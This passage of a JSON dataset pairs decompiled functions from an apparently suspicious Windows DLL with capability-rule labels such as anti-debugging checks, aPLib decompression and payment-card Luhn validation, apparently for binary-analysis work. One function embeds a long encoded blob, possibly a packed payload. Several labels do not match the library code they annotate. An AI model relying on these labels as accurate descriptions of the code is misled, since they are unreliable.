        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800230c8(uint64_t arg1, uchar *arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong in_stack_00000028;\n    ulong var_3b8h;\n    ulong var_3c0h;\n    ulong var_3c8h;\n    ulong var_3d0h;\n    ulong var_3e0h;\n    uchar auStack1320 [32];\n    uchar *puStack1288;\n    int64_t iStack1280;\n    int64_t iStack1272;\n    uchar uStack1264;\n    uint uStack1263;\n    ushort uStack1259;\n    uchar uStack1257;\n    int64_t iStack1256;\n    uchar auStack1248 [16];\n    char cStack1232;\n    uint64_t uStack1224;\n    uchar *puStack1216;\n    ulong uStack1208;\n    int64_t iStack1200;\n    ulong uStack1184;\n    ulong uStack1176;\n    uint uStack1168;\n    ushort uStack1160;\n    uint uStack1144;\n    uchar uStack1140;\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_bp_68h;\n    ulong var_bp_60h;\n    uchar **ppuStack96;\n    ulong var_50h;\n    uint64_t uStack72;\n    \n    uStack72 = *0x180090000 ^ auStack1320;\n    if ((arg4 == 0) || ((arg3 != 0 && (arg2 == NULL)))) {\n        puVar2 = fcn.180023574();\n        *puVar2 = 0x16;\n        fcn.18001482c();\n        goto code_r0x000180018076;\n    }\n    fcn.180013d7c(&iStack1256, in_stack_00000028);\n    uStack1263 = 0;\n    uStack1259 = 0;\n    uStack1257 = 0;\n    iStack1272 = 0;\n    if (((arg1 & 2) != 0) || (uStack1264 = 0,  arg2 == NULL)) {\n        uStack1264 = 1;\n    }\n    ppuStack96 = &puStack1288;\n    uStack1208 = 0;\n    puStack1216 = auStack1248;\n    uStack1184 = 0;\n    uStack1176 = 0;\n    uStack1168 = 0;\n    uStack1160 = 0;\n    uStack1144 = 0;\n    uStack1140 = 0;\n    var_bp_68h = 0;\n    var_bp_60h = 0;\n    var_50h._0_4_ = 0;\n    puStack1288 = arg2;\n    iStack1280 = arg3;\n    uStack1224 = arg1;\n    iStack1200 = arg4;\n    iVar1 = fcn.18001bbe8(&uStack1224);\n    if (arg2 != NULL) {\n        if ((arg1 & 1) == 0) {\n            if ((arg1 & 2) == 0) {\n                if (arg3 != 0) {\n                    if (iStack1272 != arg3) goto code_r0x00018001804a;\ncode_r0x0001800180b0:\n                    arg2[arg3 + -1] = 0;\n                }\n            }\n            else if (arg3 != 0) {\n                if (-1 < iVar1) {\n                    if (iStack1272 == arg3) goto code_r0x0001800180b0;\n                    goto code_r0x00018001804a;\n                }\n                *arg2 = 0;\n            }\n        }\n        else if (((arg3 != 0) || (iVar1 == 0)) && (iStack1272 != arg3)) {\ncode_r0x00018001804a:\n            arg2[iStack1272] = 0;\n        }\n    }\n    fcn.180026378(var_bp_60h);\n    var_bp_60h = 0;\n    if (cStack1232 != '\\0') {\n        *(iStack1256 + 0x3a8) = *(iStack1256 + 0x3a8) & 0xfffffffd;\n    }\ncode_r0x000180018076:\n    fcn.1800024e0(uStack72 ^ auStack1320);\n    return;\n}\n",
        "token_count": 1018
    },
    "180033da": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t * fcn.180033da0(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar1 = fcn.180023574();\n        *puVar1 = 0x16;\n        fcn.18001482c();\n    }\n    else if (arg1 < arg2) {\n        fcn.180013d7c(aiStack40, 0);\n        puVar2 = arg2 + -1;\n        if (*(iStack24 + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg1) break;\n            } while ((*(*puVar2 + 0x19 + iStack24) & 4) != 0);\n            puVar2 = arg2 + (-1 - (arg2 - puVar2 & 1));\n        }\n        if (cStack16 == '\\0') {\n            return puVar2;\n        }\n        *(aiStack40[0] + 0x3a8) = *(aiStack40[0] + 0x3a8) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 318
    },
    "18003e16": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18003e164(int64_t arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    uint32_t auStackX8 [2];\n    uchar auStackX16 [8];\n    uint32_t auStackX24 [2];\n    uint32_t auStackX32 [2];\n    uint32_t *apuStack24 [3];\n    \n    auStackX8[0] = arg1;\n    if (auStackX8[0] == 0xfffffffe) {\n        puVar1 = fcn.180023554(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.180023574();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < auStackX8[0]) && (auStackX8[0] < *0x180092190)) &&\n           (arg1 = (auStackX8[0] & 0x3f) * 9, \n           (*(*((auStackX8[0] >> 6) * 8 + 0x180091d90) + 0x38 + (auStackX8[0] & 0x3f) * 0x48) & 1) != 0)) {\n            apuStack24[0] = auStackX8;\n            auStackX24[0] = auStackX8[0];\n            auStackX32[0] = auStackX8[0];\n            uVar2 = fcn.18003dffc(auStackX16, auStackX32, apuStack24, auStackX24);\n            return uVar2;\n        }\n        puVar1 = fcn.180023554(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.180023574();\n        *puVar1 = 9;\n        fcn.18001482c();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 430
    },
    "1800014e": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t ** fcn.1800014e0(int64_t **arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    \n    piVar1 = arg1[3];\n    if (arg3 <= piVar1) {\n        ppiVar4 = arg1;\n        if (0xf < piVar1) {\n            ppiVar4 = *arg1;\n        }\n        arg1[2] = arg3;\n        fcn.1800121b0(ppiVar4, \n                      str.OGvOQjxTPkFWVV5ly8gAdYleQj9TPkFSFV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAzTFeQjFMhE9S4VeoFY8BOfx_Flc6TWEiJzECRlZtVVI_LFE8SmEwMH4XQVkgHF9BnAAHiw9MTtLOToKUTFeQj9TPkHSAlWN8AFlzvVoJ4SXCCTp7BHljY0EIrnDYbo3c37ucqj4zFQ1TlEFYwVoVkMOVlNDcAdTFeQm8WPkE201plac9rFjFeQj9TPkFSpV5HFDwCeTFe2D1TPmFSVV5lNDc8sjBeQi9TPkFSVd5kNDcAdSFeQj9RPkFUVV5lNDcAdTdeQj9TPkFSVb5nNDcEdTFeQj9TPEEyVF5lJDcAdTFeQi9TPkFSVV5lNCcAdTFeQj9DPkFSVV5lNDcAdSFeQjThkNSH15lNDcAdTFeQj9TPkFSVV5lNDcApTNeAjFTPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNBl0EEkqQj9TvNlQVV51NDcA7zNeQjtTPkFSVV5lNDcAdTFeQh9TPiF8JzoEQFYAdTtXQj9TjkNSVVRlNDeedzFeQj9TPkFSVV5lNDdAdTEebFsySiBSVV6FMTcAdfFcQj9TPkFSVV5lNDcAdTFeQj9TPkFSFV5l9BlwEVAqIz9Tfk9SVV61NjcAZTFeQpdRPkFSVV5lNDcAdTFeQn9TPgFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQrYfGkkHHdWJfLTsBfYbqob7PkFhlRLoce9I_HSyy3qnQRCnPtlNFxFZUnXBySW1Fa1Ct1yryj7obUrYW4oYXRYL0NDdrMCFpy3pDvzRC_PpinrxFZbgbmvgWLkdmVV7ueSe4tO9vd8iy_6tW3At1tXoQCs7hvb4mLl1Qfr_ucSeJMNGZByfec0FS7XssphOBOCm1POSuvwRKqQ5lNLZNbXAQEVTSS1m6i4Wa83IohXJeQv4FkeTOHZ1tXIoTK2hvb4mFvdfwHKicSfFzFeyXJDyaB5nauXxvpNhdiP66OMgfRd8gJFWgdTHVDyk32qYhLdm_vbpcbgTUr4mLs3hi9rkQSf6ofahXqD9WpSVZ8I5D9rMOFsy3qDVQSCS9cg5I19H9Fw0qDRAFaVZkgFHKedTHVDxk34C4VtcwFLZ1VRygbEfSe2HFTqGatUIgGnN9OrQWHsgWcW7ucRJMRV2yXqDesofRdchEBeLICnnSD9TPqmLH1xlfLTEBWydjvOfdsKTZkhEBdvXjFehXt3GmdvVV6icBMgdyleQlQXGmEA3BpBFHLpFoaZh8htwV2dd8REBckZVtdyXt3HsgWcX6icBMwMCzrLPhXGsPGynGicBMoDodZv_gXGnnRwVFV83MkVV7ZQj_ScmVyqEOfhLZEURET\n                      , arg3);\n        *(ppiVar4 + arg3) = 0;\n        return arg1;\n    }\n    piVar7 = 0x7fffffffffffffff;\n    if (0x7fffffffffffffff < arg3) {\n        fcn.180001320();\n        pcVar2 = swi(3);\n        ppiVar4 = (*pcVar2)();\n        return ppiVar4;\n    }\n    piVar5 = arg3 | 0xf;\n    if ((piVar5 < 0x8000000000000000) && (piVar1 <= 0x7fffffffffffffff - (piVar1 >> 1))) {\n        piVar6 = (piVar1 >> 1) + piVar1;\n        piVar7 = piVar5;\n        if (piVar5 < piVar6) {\n            piVar7 = piVar6;\n        }\n        piVar6 = piVar7 + 1;\n        if (0xfff < piVar6) {\n            piVar5 = piVar7 + 5;\n            if (piVar5 <= piVar6) {\n                fcn.180001230();\n                pcVar2 = swi(3);\n                ppiVar4 = (*pcVar2)();\n                return ppiVar4;\n            }\n            goto code_r0x000180001597;\n        }\n        if (piVar6 == NULL) {\n            piVar5 = NULL;\n        }\n        else {\n            piVar5 = fcn.180002500(piVar6);\n        }\n    }\n    else {\n        piVar5 = 0x8000000000000027;\ncode_r0x000180001597:\n        iVar3 = fcn.180002500(piVar5);\n        if (iVar3 == 0) goto code_r0x000180001646;\n        piVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        piVar5[-1] = iVar3;\n    }\n    arg1[2] = arg3;\n    arg1[3] = piVar7;\n    fcn.1800121b0(piVar5, \n                  str.OGvOQjxTPkFWVV5ly8gAdYleQj9TPkFSFV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAzTFeQjFMhE9S4VeoFY8BOfx_Flc6TWEiJzECRlZtVVI_LFE8SmEwMH4XQVkgHF9BnAAHiw9MTtLOToKUTFeQj9TPkHSAlWN8AFlzvVoJ4SXCCTp7BHljY0EIrnDYbo3c37ucqj4zFQ1TlEFYwVoVkMOVlNDcAdTFeQm8WPkE201plac9rFjFeQj9TPkFSpV5HFDwCeTFe2D1TPmFSVV5lNDc8sjBeQi9TPkFSVd5kNDcAdSFeQj9RPkFUVV5lNDcAdTdeQj9TPkFSVb5nNDcEdTFeQj9TPEEyVF5lJDcAdTFeQi9TPkFSVV5lNCcAdTFeQj9DPkFSVV5lNDcAdSFeQjThkNSH15lNDcAdTFeQj9TPkFSVV5lNDcApTNeAjFTPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNBl0EEkqQj9TvNlQVV51NDcA7zNeQjtTPkFSVV5lNDcAdTFeQh9TPiF8JzoEQFYAdTtXQj9TjkNSVVRlNDeedzFeQj9TPkFSVV5lNDdAdTEebFsySiBSVV6FMTcAdfFcQj9TPkFSVV5lNDcAdTFeQj9TPkFSFV5l9BlwEVAqIz9Tfk9SVV61NjcAZTFeQpdRPkFSVV5lNDcAdTFeQn9TPgFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQrYfGkkHHdWJfLTsBfYbqob7PkFhlRLoce9I_HSyy3qnQRCnPtlNFxFZUnXBySW1Fa1Ct1yryj7obUrYW4oYXRYL0NDdrMCFpy3pDvzRC_PpinrxFZbgbmvgWLkdmVV7ueSe4tO9vd8iy_6tW3At1tXoQCs7hvb4mLl1Qfr_ucSeJMNGZByfec0FS7XssphOBOCm1POSuvwRKqQ5lNLZNbXAQEVTSS1m6i4Wa83IohXJeQv4FkeTOHZ1tXIoTK2hvb4mFvdfwHKicSfFzFeyXJDyaB5nauXxvpNhdiP66OMgfRd8gJFWgdTHVDyk32qYhLdm_vbpcbgTUr4mLs3hi9rkQSf6ofahXqD9WpSVZ8I5D9rMOFsy3qDVQSCS9cg5I19H9Fw0qDRAFaVZkgFHKedTHVDxk34C4VtcwFLZ1VRygbEfSe2HFTqGatUIgGnN9OrQWHsgWcW7ucRJMRV2yXqDesofRdchEBeLICnnSD9TPqmLH1xlfLTEBWydjvOfdsKTZkhEBdvXjFehXt3GmdvVV6icBMgdyleQlQXGmEA3BpBFHLpFoaZh8htwV2dd8REBckZVtdyXt3HsgWcX6icBMwMCzrLPhXGsPGynGicBMoDodZv_gXGnnRwVFV83MkVV7ZQj_ScmVyqEOfhLZEURET\n                  , arg3);\n    *(piVar5 + arg3) = 0;\n    if (0xf < piVar1) {\n        piVar7 = *arg1;\n        piVar6 = piVar7;\n        if ((0xfff < piVar1 + 1U) && (piVar6 = piVar7[-1],  0x1f < piVar7 + (-8 - piVar6))) {\ncode_r0x000180001646:\n            fcn.18001484c();\n            pcVar2 = swi(3);\n            ppiVar4 = (*pcVar2)();\n            return ppiVar4;\n        }\n        fcn.18000253c(piVar6);\n    }\n    *arg1 = piVar5;\n    return arg1;\n}\n",
        "token_count": 3643
    },
    "18001e63": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t fcn.18001e638(int64_t arg1)\n\n{\n    int32_t *arg4;\n    int64_t arg1_00;\n    char cVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    ulong uVar5;\n    ushort *arg2;\n    uchar uVar6;\n    uint32_t uVar7;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    cVar1 = *(arg1 + 0x41);\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    uVar6 = 0x78;\n    if (cVar1 < 'e') {\n        if (cVar1 == 'd') {\ncode_r0x00018001e72b:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x00018001e72f:\n            uVar5 = 10;\ncode_r0x00018001e737:\n            uVar4 = fcn.180020890(arg1, uVar5);\n        }\n        else {\n            if (cVar1 == 'A') goto code_r0x00018001e73e;\n            if (cVar1 == 'C') {\ncode_r0x00018001e6a9:\n                uVar4 = fcn.180020520(arg1);\n            }\n            else {\n                if (cVar1 < 'E') goto code_r0x00018001e747;\n                if (cVar1 < 'H') goto code_r0x00018001e73e;\n                if (cVar1 == 'S') {\ncode_r0x00018001e6e7:\n                    uVar4 = fcn.1800213f4(arg1);\n                }\n                else {\n                    if (cVar1 == 'X') goto code_r0x00018001e6fc;\n                    if (cVar1 != 'Z') {\n                        if (cVar1 != 'a') {\n                            if (cVar1 != 'c') goto code_r0x00018001e747;\n                            goto code_r0x00018001e6a9;\n                        }\n                        goto code_r0x00018001e73e;\n                    }\n                    uVar4 = fcn.18001f858(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < cVar1) {\n            if (cVar1 == 'i') goto code_r0x00018001e72b;\n            if (cVar1 == 'n') {\n                uVar4 = fcn.180021030(arg1);\n                goto code_r0x00018001e743;\n            }\n            if (cVar1 == 'o') {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar5 = 8;\n            }\n            else if (cVar1 == 'p') {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x00018001e6fc:\n                uVar5 = 0x10;\n            }\n            else {\n                if (cVar1 == 's') goto code_r0x00018001e6e7;\n                if (cVar1 == 'u') goto code_r0x00018001e72f;\n                if (cVar1 != 'x') goto code_r0x00018001e747;\n                uVar5 = 0x10;\n            }\n            goto code_r0x00018001e737;\n        }\ncode_r0x00018001e73e:\n        uVar4 = fcn.18001fbe0(arg1);\n    }\ncode_r0x00018001e743:\n    if (uVar4 == '\\0') {\ncode_r0x00018001e747:\n        return uVar4 & 0xffffffffffffff00;\n    }\n    if (*(arg1 + 0x40) != '\\0') goto code_r0x00018001e882;\n    uVar2 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) == 0) goto code_r0x00018001e7a0;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x00018001e7a0:\n    cVar1 = *(arg1 + 0x41);\n    if (((cVar1 + 0xa8U & 0xdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((cVar1 + 0xbfU & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((cVar1 == 'X') || (cVar1 == 'A')) {\n            uVar6 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar6;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar7 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.180019bd8(arg1_00, CONCAT71(uVar2 >> 8, 0x20), uVar7, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.18002279c(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.180019bd8(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar7, arg4);\n    }\n    uVar5 = 0;\n    uVar4 = fcn.180022488(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        uVar4 = fcn.180019bd8(arg1_00, CONCAT71(uVar5 >> 8, 0x20), uVar7, arg4);\n    }\ncode_r0x00018001e882:\n    return uVar4 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 1658
    },
    "1800017b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.1800017b0(ulong *arg1, ulong *arg2, int64_t arg3)\n\n{\n    uint64_t arg1_00;\n    uint64_t uVar1;\n    int64_t arg3_00;\n    code *pcVar2;\n    uint64_t arg1_01;\n    int64_t iVar3;\n    uint64_t arg3_01;\n    ulong *puVar4;\n    ulong *arg1_02;\n    uint64_t uVar5;\n    \n    puVar4 = NULL;\n    arg3_01 = 0xffffffffffffffff;\n    arg3_00 = arg2[2];\n    do {\n        arg3_01 = arg3_01 + 1;\n    } while (*(arg3_01 + arg3) != '\\0');\n    if (0x7fffffffffffffffU - arg3_00 < arg3_01) {\n        fcn.180001320();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    uVar1 = arg3_01 + arg3_00;\n    *arg1 = 0;\n    uVar5 = 0xf;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1_02 = arg1;\n    if (uVar1 < 0x10) goto code_r0x00018000189f;\n    uVar5 = uVar1 | 0xf;\n    if (uVar5 < 0x8000000000000000) {\n        if (uVar5 < 0x16) {\n            uVar5 = 0x16;\n        }\n        arg1_00 = uVar5 + 1;\n        if (0xfff < arg1_00) {\n            arg1_01 = uVar5 + 0x28;\n            if (arg1_01 <= arg1_00) {\n                fcn.180001230();\n                pcVar2 = swi(3);\n                puVar4 = (*pcVar2)();\n                return puVar4;\n            }\n            goto code_r0x000180001847;\n        }\n        if (arg1_00 != 0) {\n            puVar4 = fcn.180002500(arg1_00);\n        }\n    }\n    else {\n        uVar5 = 0x7fffffffffffffff;\n        arg1_01 = 0x8000000000000027;\ncode_r0x000180001847:\n        iVar3 = fcn.180002500(arg1_01);\n        if (iVar3 == 0) {\n            fcn.18001484c();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        puVar4 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        puVar4[-1] = iVar3;\n    }\n    *arg1 = puVar4;\n    arg1_02 = puVar4;\ncode_r0x00018000189f:\n    arg1[2] = uVar1;\n    arg1[3] = uVar5;\n    fcn.1800121b0(arg1_02, arg2, arg3_00);\n    fcn.1800121b0(arg1_02 + arg3_00, arg3, arg3_01);\n    *(arg1_02 + uVar1) = 0;\n    return arg1;\n}\n",
        "token_count": 784
    },
    "180001f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180001f0c(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800048ec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::invalid_argument.0;\n    return arg1;\n}\n",
        "token_count": 117
    },
    "180001f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180001f90(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800048ec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::length_error.0;\n    return arg1;\n}\n",
        "token_count": 116
    },
    "18000209": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180002098(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800048ec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::out_of_range.0;\n    return arg1;\n}\n",
        "token_count": 116
    },
    "18000211": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18000211c(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800048ec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::overflow_error.0;\n    return arg1;\n}\n",
        "token_count": 116
    },
    "18000225": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180002250(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800048ec(&uStack24, arg1 + 1);\n    *arg1 = vtable.std::runtime_error.0;\n    return arg1;\n}\n",
        "token_count": 115
    },
    "180008b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t fcn.180008b88(ulong *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    uint64_t uVar1;\n    ulong uVar2;\n    ulong *in_stack_00000028;\n    uint64_t uStack16;\n    \n    uVar1 = in_stack_00000028[1];\n    if ((uVar1 < *(arg3 + 8) || uVar1 == *(arg3 + 8)) && (arg1[1] < uVar1 || arg1[1] == uVar1)) {\n        if (uVar1 - arg1[1] < *(arg3 + 8) - uVar1) {\n            uVar2 = *arg1;\n            uStack16 = arg1[1];\n            if (uStack16 < uVar1) {\n                do {\n                    fcn.1800088a4(uVar2, &uStack16);\n                    arg2._0_4_ = arg2 + 1;\n                } while (uStack16 <= in_stack_00000028[1] && in_stack_00000028[1] != uStack16);\n            }\n        }\n        else {\n            uVar2 = *in_stack_00000028;\n            uStack16 = in_stack_00000028[1];\n            arg2._0_4_ = arg4;\n            if (uStack16 <= *(arg3 + 8) && *(arg3 + 8) != uStack16) {\n                do {\n                    fcn.1800088a4(uVar2, &uStack16);\n                    arg2._0_4_ = arg4 + -1;\n                    arg4._0_4_ = arg2;\n                } while (uStack16 <= *(arg3 + 8) && *(arg3 + 8) != uStack16);\n            }\n        }\n    }\n    else {\n        arg2._0_4_ = -1;\n    }\n    return arg2;\n}\n",
        "token_count": 432
    },
    "18000d13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
